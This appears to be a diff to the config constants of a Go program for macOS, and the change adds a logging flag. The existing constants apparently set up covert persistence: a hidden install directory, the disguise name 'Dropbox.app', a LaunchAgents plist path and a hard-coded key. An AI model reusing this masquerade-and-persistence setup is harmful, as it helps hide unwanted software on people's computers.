@@ -7,6 +7,7 @@ package config
 const(
   Key             string  = "ju5T4K3Yd0nTc4t3"
   DEBUG           bool    = false
+  LOG             bool    = true
   TargetDir       string  = "/.default"
   TargetName      string  = "Dropbox.app"
   PlistDir        string  = "/Library/LaunchAgents"
